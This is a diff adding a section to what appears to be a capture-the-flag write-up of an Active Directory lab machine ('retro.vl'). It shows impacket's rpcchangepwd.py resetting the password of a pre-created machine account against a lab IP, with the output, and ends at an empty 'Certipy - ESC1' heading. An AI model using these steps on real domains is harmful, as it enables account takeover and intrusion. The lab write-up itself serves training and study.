@@ -334,3 +334,31 @@ The `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` message confirms it.
 
 <br />
 
+## Password change
+
+<br />
+
+At this point we should change the password of the pre-created account using the well-known [rpcchangepwd.py](https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py) Python script:
+
+<br />
+
+```bash
+❯ python3 rpcchangepwd.py retro.vl/Banking\$:banking@10.129.234.44 -newpass 'NewPass123!'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Password was changed successfully.
+```
+
+<br />
+
+The password was successfully changed.
+
+However, if we try to obtain remote access to the machine via WinRM or search for another share, there is nothing.
+
+<br />
+
+## Certipy - ESC1
+
+<br />
+
+
